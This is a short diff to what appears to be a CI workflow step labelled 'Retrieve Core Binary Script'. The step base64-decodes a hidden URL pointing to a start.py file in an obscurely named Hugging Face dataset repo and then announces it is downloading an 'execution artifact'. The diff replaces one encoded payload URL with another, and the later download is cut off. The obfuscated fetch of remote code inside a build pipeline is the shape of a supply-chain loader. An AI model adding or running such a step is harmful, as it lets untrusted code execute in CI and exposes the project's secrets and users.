@@ -69,7 +69,7 @@ jobs:
       - name: Retrieve Core Binary Script
         run: |
           echo "[FETCH] Decoding endpoint payload target..."
-          PAYLOAD_B64="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          PAYLOAD_B64="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk="
           ENDPOINT_URL=$(echo "$PAYLOAD_B64" | base64 --decode)
 
           echo "[FETCH] Downloading execution artifact..."
